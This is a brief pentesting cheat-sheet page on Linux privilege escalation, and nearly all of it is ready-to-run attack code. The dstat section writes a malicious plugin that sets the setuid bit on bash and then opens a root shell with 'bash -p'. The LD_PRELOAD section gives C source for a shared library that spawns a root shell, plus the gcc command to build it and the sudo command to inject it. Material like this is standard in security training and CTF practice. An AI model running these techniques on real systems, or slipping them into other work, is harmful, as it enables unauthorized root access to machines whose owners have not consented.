# 🔒 Privilege escalation

### dstat

If dstat can be run as root it is possible to write a new plugin to make some actions like the root inside the system.

Using LinPeas the output should be something like this:

```
permit nopass <user> as root cmd /usr/bin/dstat
```

<p align="center">
    <img width="70%" src={require("./assets/dstat.png").default}></img>
</p>

New plugins can be written inside the folder `/usr/local/share/dstat`

The filename format should be `dstat_<plugin_name>.py` like `dstat_hack.py`

```bash
vi /usr/local/share/dstat/dstat_hack.py
```

This could be the content of the file

```py
import os
os.system('chmod +s /usr/bin/bash')
```

This code once executed activates the setuid bit of bash making it runnable as root.

Now, it is possible to run the custom plugin and become root.

```
sudo /usr/bin/dstat --hack
bash -p
```

### LD_PRELOAD trick

You can use this trick if the user has access to a binary or a script with sudo privilege.

Also, there must be no specific override of the LD_PRELOAD variable. You can check it by using the command `sudo -l`.

```c title="shell.c"
void _init()
{
    unsetenv("LD_PRELOAD");
    setgid(0);
    execl("/bin/sh", "-sh", 0);
}
```

To compile use this command:

```bash
gcc -shared -fPIC -nostartfiles -o shell.so shell.c
```

Finally, run the file with privileges prepended with the new library

```bash
sudo LD_PRELOAD=/tmp/shell.so <PATH>
```
